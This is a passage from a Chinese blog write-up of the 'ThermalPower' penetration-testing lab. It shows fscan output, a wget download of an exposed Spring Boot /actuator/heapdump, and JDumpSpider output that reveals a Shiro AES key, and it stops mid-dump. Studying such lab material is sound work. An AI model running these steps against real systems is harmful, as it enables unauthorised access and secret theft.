<!DOCTYPE html>
<html lang="zh-CN">
    <head>
  <!-- 元数据 -->
  <meta charset="utf-8">
  
  
  <title>春秋云镜-ThermalPower | lvzhouhang</title>
  <link rel="canonical" href="https://lvzhouhang.xyz/2025/05/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-ThermalPower/">
  <meta name="author" content="lvzhouhang" />
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="index,follow" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="format-detection" content="telphone=no, email=no" />
  
    <meta name="keywords" content="靶机" />
  
  <meta name="description" content="FLAG0112345678910111213141516171819202122232425262728293031323334353637┌──(root㉿kali)-[~&#x2F;Desktop&#x2F;tmp&#x2F;tmp]└─# ..&#x2F;..&#x2F;pentest&#x2F;fscan&#x2F;fscan2 -h 39.98.122.145┌──────────────────────────────────────────────┐">
<meta property="og:type" content="article">
<meta property="og:title" content="春秋云镜-ThermalPower">
<meta property="og:url" content="https://lvzhouhang.xyz/2025/05/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-ThermalPower/index.html">
<meta property="og:site_name" content="lvzhouhang">
<meta property="og:description" content="FLAG0112345678910111213141516171819202122232425262728293031323334353637┌──(root㉿kali)-[~&#x2F;Desktop&#x2F;tmp&#x2F;tmp]└─# ..&#x2F;..&#x2F;pentest&#x2F;fscan&#x2F;fscan2 -h 39.98.122.145┌──────────────────────────────────────────────┐">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-05-02T03:09:18.000Z">
<meta property="article:modified_time" content="2025-05-02T14:00:33.448Z">
<meta property="article:author" content="lvzhouhang">
<meta property="article:tag" content="靶机">
<meta name="twitter:card" content="summary">
  
  <!-- 样式表文件 -->
  <link rel="stylesheet" id="kratos-css" href="/css/kr-core.min.css" media="all"></link>
  
    <link rel="stylesheet" id="highlight-css" href="/css/highlight/highlight.js/night-eighties.min.css" media="all"></link>
  
  <link rel="stylesheet" id="theme-light-css" href="/css/kr-theme/light.min.css" media="all"></link>
  <link rel="stylesheet" id="theme-dark-css" href="/css/kr-theme/dark.min.css" media="(prefers-color-scheme: dark)"></link>
  <script src="/js/kr-theme.min.js"></script>
  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></link>
  
    <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></link>
  
  
    <link rel="stylesheet" href="/vendors/viewerjs@1.11.6/dist/viewer.min.css"></link>
  
  <!-- 不得不预先加载的一些JS文件 -->
  
    <script src="/vendors/qr-code-styling@1.6.0-rc.1/lib/qr-code-styling.js"></script>
  
  <!-- 自定义站点横幅和背景 -->
  <style>
    
      .kratos-cover.kratos-cover-2 {
        background-image: url('https://dev.krt.moe/demo-assets/banner.webp');
      }
      html[data-theme="dark"] .kratos-cover.kratos-cover-2 {
        background-image: url('https://dev.krt.moe/demo-assets/banner_dark.webp');
      }
    
    
      @media(min-width:768px) {
        body.custom-background {
          background-image: url('https://dev.krt.moe/demo-assets/bg.webp');
        }
        html[data-theme="dark"] body.custom-background {
          background-image: url('https://dev.krt.moe/demo-assets/bg.webp');
        }
      }
    
    
      .widget-kratos-about .photo-background {
        background-image: url('/images/default.webp');
      }
      html[data-theme="dark"] .widget-kratos-about .photo-background {
        background-image: url('/images/default.webp');
      }
    
  </style>

  <!-- 额外的追加注入项 -->
  
<meta name="generator" content="Hexo 7.3.0"></head>

    <body class="custom-background">
        <div id="kratos-wrapper">
    <div id="kratos-page">
        <div id="kratos-header">
            <header id="kratos-desktop-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="nav-header">
                        <nav id="kratos-menu-wrap">
                            <ul id="kratos-primary-menu" class="sf-menu">
                                
                                    <li>
                                        
                                            <a href="/">
                                        
                                            
                                                <i class="fa fa-home"></i>
                                            
                                            首页
                                        </a>
                                        
                                    </li>
                                
                                    <li>
                                        
                                            <a href="/archives/">
                                        
                                            
                                                <i class="fa fa-file"></i>
                                            
                                            档案馆
                                        </a>
                                        
                                    </li>
                                
                                    <li>
                                        
                                            <a href="/about/">
                                        
                                            
                                                <i class="fa fa-user"></i>
                                            
                                            关于
                                        </a>
                                        
                                    </li>
                                
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>
            <header id="kratos-mobile-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="color-logo"><a href="/">lvzhouhang</a></div>
                    <div id="kratos-nav-toggle-wrapper" class="nav-toggle">
                        <a id="kratos-nav-toggle" class="kratos-nav-toggle">
                            <i></i>
                        </a>
                    </div>
                </div>
            </header>
        </div>
        <div class="kratos-start kratos-hero-2">
            <!-- <div class="kratos-overlay"></div> -->
            <div class="kratos-cover kratos-cover-2 text-center">
                <div class="desc desc2 animate-box">
                    <a href="/">
                        <h2>lvzhouhang</h2> <br />
                        <span></span>
                    </a>
                </div>
            </div>
        </div>

        <div id="kratos-blog-post">
            <div class="container">
                <div id="main" class="row">


        

            

            <section class="kr-main-col col-md-8">

        

            <article itemscope itemtype="https://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/05/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-ThermalPower/">
    <div class="kratos-hentry kratos-page-inner clearfix">
        <header class="kratos-page-header">
            
                <h1 class="kratos-page-title text-center" itemprop="name headline">春秋云镜-ThermalPower</h1>
            
            <ul class="kratos-page-meta text-center">
                <li><time datetime="2025-05-02T03:09:18.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2025-05-02</time></li>
                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                    <i class="fa fa-user"></i> 作者 <span itemprop="name">lvzhouhang</span>
                </li>
                
                    <li>
                        <i class="fa fa-edit"></i> 
                        
                        
                            ~28.92K
                        
                        字
                    </li>
                
                
                
            </ul>
        </header>
        <div class="kratos-page-content kr-post">
            
            
            
                <div class="kratos-post-inner-toc toc-div-class" >
                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FLAG01"><span class="toc-number">1.</span> <span class="toc-text">FLAG01</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FLAG02"><span class="toc-number">2.</span> <span class="toc-text">FLAG02</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FLAG03"><span class="toc-number">3.</span> <span class="toc-text">FLAG03</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FLAG04"><span class="toc-number">4.</span> <span class="toc-text">FLAG04</span></a></li></ol>
                </div>
            
            <hr />
            <div itemprop="articleBody"><h1 id="FLAG01"><a href="#FLAG01" class="headerlink" title="FLAG01"></a>FLAG01</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/tmp]</span><br><span class="line">└─# ../../pentest/fscan/fscan2 -h 39.98.122.145</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-05-01 23:10:46] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-05-01 23:10:46] [INFO] 开始信息扫描</span><br><span class="line">[2025-05-01 23:10:46] [INFO] 最终有效主机数量: 1</span><br><span class="line">[2025-05-01 23:10:46] [INFO] 开始主机扫描</span><br><span class="line">[2025-05-01 23:10:46] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-05-01 23:10:46] [SUCCESS] 端口开放 39.98.122.145:22</span><br><span class="line">[2025-05-01 23:10:47] [SUCCESS] 服务识别 39.98.122.145:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]</span><br><span class="line">[2025-05-01 23:10:49] [SUCCESS] 端口开放 39.98.122.145:8080</span><br><span class="line">[2025-05-01 23:10:54] [SUCCESS] 服务识别 39.98.122.145:8080 =&gt; [http]</span><br><span class="line">[2025-05-01 23:10:56] [INFO] 存活端口数量: 2</span><br><span class="line">[2025-05-01 23:10:56] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-05-01 23:10:56] [INFO] 加载的插件: ssh, webpoc, webtitle</span><br><span class="line">[2025-05-01 23:10:56] [SUCCESS] 网站标题 http://39.98.122.145:8080 状态码:302 长度:0      标题:无标题 重定向地址: http://39.98.122.145:8080/login;jsessionid=C10B39BA0BC886E7924F52A8BA23B5B6</span><br><span class="line">[2025-05-01 23:10:57] [SUCCESS] 网站标题 http://39.98.122.145:8080/login;jsessionid=C10B39BA0BC886E7924F52A8BA23B5B6 状 态码:200 长度:2936   标题:火创能源监控画面管理平台</span><br><span class="line">[2025-05-01 23:11:00] [SUCCESS] 目标: http://39.98.122.145:8080</span><br><span class="line">  漏洞类型: poc-yaml-spring-actuator-heapdump-file</span><br><span class="line">  漏洞名称:</span><br><span class="line">  详细信息:</span><br><span class="line">        author:AgeloVito</span><br><span class="line">        links:https://www.cnblogs.com/wyb628/p/8567610.html</span><br><span class="line">[2025-05-01 23:11:00] [SUCCESS] 目标: http://39.98.122.145:8080</span><br><span class="line">  漏洞类型: poc-yaml-springboot-env-unauth</span><br><span class="line">  漏洞名称: spring2</span><br><span class="line">  详细信息:</span><br><span class="line">        links:https://github.com/LandGrey/SpringBootVulExploit</span><br><span class="line">[2025-05-01 23:11:03] [SUCCESS] 扫描已完成: 3/3</span><br></pre></td></tr></table></figure>

<p>可以扫有8080端口有一个poc-yaml-spring-actuator-heapdump-file，先将heapdump文件下载下来    </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/tmp]</span><br><span class="line">└─# wget  http://39.98.122.145:8080/actuator/heapdump</span><br><span class="line">--2025-05-01 23:13:13--  http://39.98.122.145:8080/actuator/heapdump</span><br><span class="line">Connecting to 39.98.122.145:8080... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200</span><br><span class="line">Length: 31181349 (30M) [application/octet-stream]</span><br><span class="line">Saving to: ‘heapdump’</span><br><span class="line"></span><br><span class="line">heapdump                      100%[=================================================&gt;]  29.74M  1.36MB/s    in 21s</span><br><span class="line"></span><br><span class="line">2025-05-01 23:13:35 (1.41 MB/s) - ‘heapdump’ saved [31181349/31181349]</span><br></pre></td></tr></table></figure>

<p>然后用工具进行分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/tmp]</span><br><span class="line">└─# java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump</span><br><span class="line">===========================================</span><br><span class="line">SpringDataSourceProperties</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">WeblogicDataSourceConnectionPoolConfig</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">MongoClient</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">AliDruidDataSourceWrapper</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">HikariDataSource</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">RedisStandaloneConfiguration</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">JedisClient</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">CookieRememberMeManager(ShiroKey)</span><br><span class="line">-------------</span><br><span class="line">algMode = CBC, key = QZYysgMYhG6/CzIJlVpR2g==, algName = AES</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">OriginTrackedMapPropertySource</span><br><span class="line">-------------</span><br><span class="line">management.endpoints.web.exposure.include = *</span><br><span class="line">spring.thymeleaf.encoding = UTF-8</span><br><span class="line">management.endpoint.health.show-details = always</span><br><span class="line">spring.thymeleaf.cache = true</span><br><span class="line">spring.thymeleaf.content-type = text/html</span><br><span class="line">server.port = 8080</span><br><span class="line">spring.thymeleaf.check-template = true</span><br><span class="line">management.endpoints.jmx.exposure.include = *</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">MutablePropertySources</span><br><span class="line">-------------</span><br><span class="line">awt.toolkit = sun.awt.X11.XToolkit</span><br><span class="line">sun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes</span><br><span class="line">java.protocol.handler.pkgs = org.springframework.boot.loader</span><br><span class="line">sun.management.compiler = HotSpot 64-Bit Tiered Compilers</span><br><span class="line">sun.cpu.isalist =</span><br><span class="line">sun.jnu.encoding = UTF-8</span><br><span class="line">java.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08</span><br><span class="line">java.class.path = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jar</span><br><span class="line">path.separator = :</span><br><span class="line">java.vm.vendor = Private Build</span><br><span class="line">os.version = 5.4.0-166-generic</span><br><span class="line">java.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed</span><br><span class="line">java.runtime.name = OpenJDK Runtime Environment</span><br><span class="line">file.encoding = UTF-8</span><br><span class="line">catalina.useNaming = false</span><br><span class="line">spring.beaninfo.ignore = true</span><br><span class="line">java.vm.specification.version = 1.8</span><br><span class="line">os.name = Linux</span><br><span class="line">java.vm.name = OpenJDK 64-Bit Server VM</span><br><span class="line">local.server.port = null</span><br><span class="line">user.country = US</span><br><span class="line">java.vendor.url.bug = http://bugreport.sun.com/bugreport/</span><br><span class="line">sun.java.command = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jar</span><br><span class="line">java.io.tmpdir = /tmp</span><br><span class="line">catalina.home = /tmp/tomcat.8080.2227855515484347988</span><br><span class="line">java.version = 1.8.0_392</span><br><span class="line">user.home = /root</span><br><span class="line">user.language = en</span><br><span class="line">PID = 620</span><br><span class="line">java.awt.printerjob = sun.print.PSPrinterJob</span><br><span class="line">CONSOLE_LOG_CHARSET = UTF-8</span><br><span class="line">file.separator = /</span><br><span class="line">catalina.base = /tmp/tomcat.8080.2227855515484347988</span><br><span class="line">java.vm.info = mixed mode</span><br><span class="line">java.specification.name = Java Platform API Specification</span><br><span class="line">java.vm.specification.vendor = Oracle Corporation</span><br><span class="line">FILE_LOG_CHARSET = UTF-8</span><br><span class="line">java.awt.graphicsenv = sun.awt.X11GraphicsEnvironment</span><br><span class="line">java.awt.headless = true</span><br><span class="line">sun.io.unicode.encoding = UnicodeLittle</span><br><span class="line">java.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">MapPropertySources</span><br><span class="line">-------------</span><br><span class="line">local.server.port = null</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">ConsulPropertySources</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">JavaProperties</span><br><span class="line">-------------</span><br><span class="line">java.util.logging.FileHandler.pattern = %h/java%u.log</span><br><span class="line">awt.toolkit = sun.awt.X11.XToolkit</span><br><span class="line">sun.cpu.isalist =</span><br><span class="line">sun.jnu.encoding = UTF-8</span><br><span class="line">java.class.path = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jar</span><br><span class="line">jdk.security.legacyAlgorithms = SHA1, RSA keySize &lt; 2048, DSA keySize &lt; 2048</span><br><span class="line">java.vm.vendor = Private Build</span><br><span class="line">jdk.disabled.namedCurves = secp112r1, secp112r2, secp128r1, secp128r2, secp160k1, secp160r1, secp160r2, secp192k1, secp192r1, secp224k1, secp224r1, secp256k1, sect113r1, sect113r2, sect131r1, sect131r2, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1, X9.62 c2tnb191v1, X9.62 c2tnb191v2, X9.62 c2tnb191v3, X9.62 c2tnb239v1, X9.62 c2tnb239v2, X9.62 c2tnb239v3, X9.62 c2tnb359v1, X9.62 c2tnb431r1, X9.62 prime192v2, X9.62 prime192v3, X9.62 prime239v1, X9.62 prime239v2, X9.62 prime239v3, brainpoolP256r1, brainpoolP320r1, brainpoolP384r1, brainpoolP512r1</span><br><span class="line">crypto.policy = unlimited</span><br><span class="line">jceks.key.serialFilter = java.lang.Enum;java.security.KeyRep;java.security.KeyRep$Type;javax.crypto.spec.SecretKeySpec;!*</span><br><span class="line">sun.arch.data.model = 64</span><br><span class="line">login.configuration.provider = sun.security.provider.ConfigFile</span><br><span class="line">catalina.useNaming = false</span><br><span class="line">user.timezone =</span><br><span class="line">security.overridePropertiesFile = true</span><br><span class="line">java.vm.specification.version = 1.8</span><br><span class="line">os.name = Linux</span><br><span class="line">user.country = US</span><br><span class="line">security.provider.7 = com.sun.security.sasl.Provider</span><br><span class="line">sun.boot.library.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64</span><br><span class="line">sun.java.command = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jar</span><br><span class="line">security.provider.9 = sun.security.smartcardio.SunPCSC</span><br><span class="line">jdk.security.caDistrustPolicies = SYMANTEC_TLS</span><br><span class="line">sun.cpu.endian = little</span><br><span class="line">user.home = /root</span><br><span class="line">user.language = en</span><br><span class="line">java.specification.vendor = Oracle Corporation</span><br><span class="line">en = UTF-8</span><br><span class="line">security.provider.1 = sun.security.provider.Sun</span><br><span class="line">security.provider.2 = sun.security.rsa.SunRsaSign</span><br><span class="line">security.provider.3 = sun.security.ec.SunEC</span><br><span class="line">networkaddress.cache.negative.ttl = 10</span><br><span class="line">jdk.tls.alpnCharset = ISO_8859_1</span><br><span class="line">security.provider.4 = com.sun.net.ssl.internal.ssl.Provider</span><br><span class="line">security.provider.5 = com.sun.crypto.provider.SunJCE</span><br><span class="line">security.provider.6 = sun.security.jgss.SunProvider</span><br><span class="line">ssl.KeyManagerFactory.algorithm = SunX509</span><br><span class="line">file.separator = /</span><br><span class="line">java.specification.name = Java Platform API Specification</span><br><span class="line">java.vm.specification.vendor = Oracle Corporation</span><br><span class="line">FILE_LOG_CHARSET = UTF-8</span><br><span class="line">.level = INFO</span><br><span class="line">java.awt.graphicsenv = sun.awt.X11GraphicsEnvironment</span><br><span class="line">ja = UTF-8</span><br><span class="line">java.awt.headless = true</span><br><span class="line">com.xyz.foo.level = SEVERE</span><br><span class="line">package.definition = sun.,com.sun.xml.internal.,com.sun.imageio.,com.sun.istack.internal.,com.sun.jmx.,com.sun.media.sound.,com.sun.naming.internal.,com.sun.proxy.,com.sun.corba.se.,com.sun.org.apache.bcel.internal.,com.sun.org.apache.regexp.internal.,com.sun.org.apache.xerces.internal.,com.sun.org.apache.xpath.internal.,com.sun.org.apache.xalan.internal.extensions.,com.sun.org.apache.xalan.internal.lib.,com.sun.org.apache.xalan.internal.res.,com.sun.org.apache.xalan.internal.templates.,com.sun.org.apache.xalan.internal.utils.,com.sun.org.apache.xalan.internal.xslt.,com.sun.org.apache.xalan.internal.xsltc.cmdline.,com.sun.org.apache.xalan.internal.xsltc.compiler.,com.sun.org.apache.xalan.internal.xsltc.trax.,com.sun.org.apache.xalan.internal.xsltc.util.,com.sun.org.apache.xml.internal.res.,com.sun.org.apache.xml.internal.resolver.helpers.,com.sun.org.apache.xml.internal.resolver.readers.,com.sun.org.apache.xml.internal.security.,com.sun.org.apache.xml.internal.serializer.utils.,com.sun.org.apache.xml.internal.utils.,com.sun.org.glassfish.,com.oracle.xmlns.internal.,com.oracle.webservices.internal.,oracle.jrockit.jfr.,org.jcp.xml.dsig.internal.,jdk.internal.,jdk.nashorn.internal.,jdk.nashorn.tools.,jdk.xml.internal.,com.sun.activation.registries.,jdk.jfr.events.,jdk.jfr.internal.,jdk.management.jfr.internal.</span><br><span class="line">sun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes</span><br><span class="line">java.protocol.handler.pkgs = org.springframework.boot.loader</span><br><span class="line">sun.management.compiler = HotSpot 64-Bit Tiered Compilers</span><br><span class="line">java.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08</span><br><span class="line">policy.provider = sun.security.provider.PolicyFile</span><br><span class="line">user.name = root</span><br><span class="line">policy.url.1 = file:$&#123;java.home&#125;/lib/security/java.policy</span><br><span class="line">path.separator = :</span><br><span class="line">fr = UTF-8</span><br><span class="line">securerandom.source = file:/dev/random</span><br><span class="line">policy.url.2 = file:$&#123;user.home&#125;/.java.policy</span><br><span class="line">jdk.tls.disabledAlgorithms = SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize &lt; 1024, EC keySize &lt; 224, 3DES_EDE_CBC, anon, NULL, include jdk.disabled.namedCurves</span><br><span class="line">os.version = 5.4.0-166-generic</span><br><span class="line">java.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed</span><br><span class="line">policy.ignoreIdentityScope = false</span><br><span class="line">java.runtime.name = OpenJDK Runtime Environment</span><br><span class="line">keystore.type.compat = true</span><br><span class="line">file.encoding = UTF-8</span><br><span class="line">spring.beaninfo.ignore = true</span><br><span class="line">java.util.logging.ConsoleHandler.formatter = java.util.logging.SimpleFormatter</span><br><span class="line">java.vm.name = OpenJDK 64-Bit Server VM</span><br><span class="line">jdk.sasl.disabledMechanisms =</span><br><span class="line">java.vendor.url.bug = http://bugreport.sun.com/bugreport/</span><br><span 